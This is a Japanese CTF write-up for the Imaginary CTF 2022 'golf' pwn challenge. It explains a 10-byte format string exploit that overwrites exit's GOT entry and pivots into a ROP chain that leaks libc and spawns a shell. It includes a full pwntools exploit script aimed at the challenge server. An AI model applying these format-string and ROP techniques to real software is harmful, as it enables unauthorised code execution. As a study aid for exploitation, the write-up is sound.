+++
title = "Imaginary CTF 2022 - golf"
date = 2022-07-19

[taxonomies]
tags = ["CTF", "Writeup", "Pwn", "FSB"]
+++

## TL;DR

- ペイロードの長さは十分だが、FSBに使える部分は小さい
- アスタリスクを指定子に利用して長い出力を短い書式で実現し、GOT Overwriteする
- `__libc_csu_init`にある大量のpopを利用してFSBペイロード部分を無視してからROPを行う

## Writeup

定番のchecksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ソースコードが添付されているが無駄に難読化されているのでGhidraのデコンパイル結果を貼ると次のようになっている。

```c
void main(void)

{
  size_t sVar1;
  long in_FS_OFFSET;
  char local_118 [264];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  fgets(local_118,0x100,stdin);
  sVar1 = strlen(local_118);
  if (sVar1 < 0xb) {
    printf(local_118);
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

重要な点は以下

- `local_118`に対して256バイトの書き込みが出来る
- `printf(local_118)`があるので自明なFSBが存在する
- ところが、`strlen(local_118)`が10以下でないと、この`printf`は呼ばれない
- 最後に`exit`が呼ばれているが、Partial RELROなのでGOT Overwriteが可能

明らかにGOT Overwriteでret2mainするような問題に思える。

ペイロードの長さ制限があるが、`strlen`はヌルバイトが現れるまでの長さを返すので、`fgets`でFSB用の書式文字列を最初に書いてからヌルバイトでパディングし、後続に値を書いておけばその値をFSBで利用できる。

問題は`printf(local_118)`で使える書式文字列はたったの10バイトである。よくあるFSBのように`%<addr>c%<num>$n`で`<addr>`に実行したいアドレスを入れて、`<num>`に`exit`のGOTに対応するスタックの位置を入れるようなペイロードでは10文字に収まらない。

そこで`%*<num>$c`を利用する、これは`num`に対応するスタックの値を書式文字列に展開するような形で利用される。例えば`%*7$c`で`7`に対応する場所に`114514`が入っていれば、この書式文字列は`%114514c`と同じであり、114514文字出力される。これを使ってペイロードの長さを短縮しGOT Overwriteを図る。

上書きするアドレスについてだが、この問題では`exit`が呼ばれた際の`rsp`は特にスタックの清掃を行った後のものではない。というわけで`exit`のGOTにROPガジェットを入れておけば、`local_118`をスタックとしてROPが出来る。但し、スタックの上の方にはFSBの書式文字列が入っているのでこれらをpopやらですっ飛ばす必要がある。

ここで[TSGCTF 2021 - coffee](https://project-euphoria.dev/problems/2022-06-14/)の事を思い出すと、先頭のFSBペイロードを無視するために`__libc_csu_init`内にある複数のpopを利用できる事がわかる。このガジェットはこの問題でも相変わらず使えるのでこれを使って前半にFSBのペイロード、後半にROPチェーンを書き込んだものをペイロードとする。

coffeeの方では`scanf`があったので簡単に追加の入力が行えたが、最初のペイロードを入力する時点ではlibcのアドレスがわからないので`fgets()`の第3引数に`stdin`を設定するのは難しい。よってlibc leakをしたらmainに戻って通常のプログラムで2回目の入力を行う。

以上を纏めると次のようなペイロードを構成した

1. `%*9$c%8$hn`で`exit`のGOTを書き換える
	1. `%*9$c`は0x12e6バイト出力するように9の位置のスタックを調整する、この値は前述の大量にpopするROPガジェットの下位2バイトである
	2. `%8$hn`は8の位置の値をアドレスとして、下位2バイトを書き換える、ここに`exit`のGOTを入れておく
2. ヌルバイトパディングを挟む
3. 1のペイロードで使うための値を入れる
4. popを複数回行うROPガジェットでpopされる分のパディングを加える
5. どこかのGOT(ここでは`fgets`を使った)を出力するROPチェーンを書いてlibc leakをする
6. mainに戻る

libc leakが完了したし、main内のプログラムでRIPが取れる事も確認したので後はやるだけなのだが、この問題ではlibcが配布されていない。というわけで複数の関数のGOTを出力して[libc-database](https://libc.rip/)に入れてlibcを特定した。

これで`system`と`"/bin/sh"`のアドレスがわかったので、先程と同様に`system("/bin/sh")`を実行するようなROPを組めば、シェルが取れる。

## Code

使ったROPガジェットがどの程度popするかわからないので適当にretを挟むという横着をしている。

```python
from pwn import remote, process, p64, ELF, u64
import sys


DEBUG = "-d" in sys.argv


if DEBUG:
    sc = remote("localhost", 13337)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
    input("[+] attach")
else:
    sc = remote("golf.chal.imaginaryctf.org", 1337)
    libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")  # from https://libc.rip/



elf = ELF("./golf")

addrs = {
    "got_exit": 0x404038,
    "got_fgets": 0x404028,
    "got_setvbuf": 0x404030,
    "got_printf": 0x404020,
    "got_strlen": 0x404018,
    "plt_printf": elf.plt["printf"],
    "plt_fgets": elf.plt["fgets"],
    "pivot": 0x404800,
    "main": 0x40121b,
    "libc_fgets": libc.symbols["fgets"],
    "libc_system": libc.symbols["system"],
    "binsh": next(libc.search(b"/bin/sh\x00"))
}

rpg = {
    "ret": 0x4012f4,
    "pop_rdi": 0x4012f3,
    "pop_rsi_r15": 0x4012f1
}

if not DEBUG:
    # for PoW msg
    sc.recvline()

payload = b"%*9$c%8$hn"
pad = b"\x00" * (16 - len(payload))
payload += pad
payload += p64(addrs["got_exit"])
payload += p64(0x12e6)  # write 0x4012e6 to got_exit
payload += p64(rpg["ret"])
payload += p64(rpg["ret"])
payload += p64(rpg["ret"])
payload += p64(rpg["ret"])
payload += p64(rpg["pop_rdi"])
key = "got_fgets"
payload += p64(addrs[key])
payload += p64(addrs["plt_printf"])
payload += p64(rpg["ret"])
payload += p64(addrs["main"])

assert len(payload) < 256
sc.sendline(payload)

sc.recvuntil(b"\x03")
res = sc.recvuntil(b"\x7f")

leak = u64(res + b"\x00\x00")
print(hex(addrs["libc_fgets"]))
# libc_addr = leak - 0x82630
libc_addr = leak - addrs["libc_fgets"]

print(f"[+] libc: {hex(libc_addr)}")

payload2 = b"114514" + b"\x00\x00"
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["ret"])
payload2 += p64(rpg["pop_rdi"])
payload2 += p64(libc_addr + addrs["binsh"])
payload2 += p64(libc_addr + addrs["libc_system"])

sc.sendline(payload2)

sc.interactive()
```

## Flag

`ictf{useless_f0rmat_string_quirks_f0r_days_9b5d191f}`

## References

- [libc-database](https://libc.rip/)
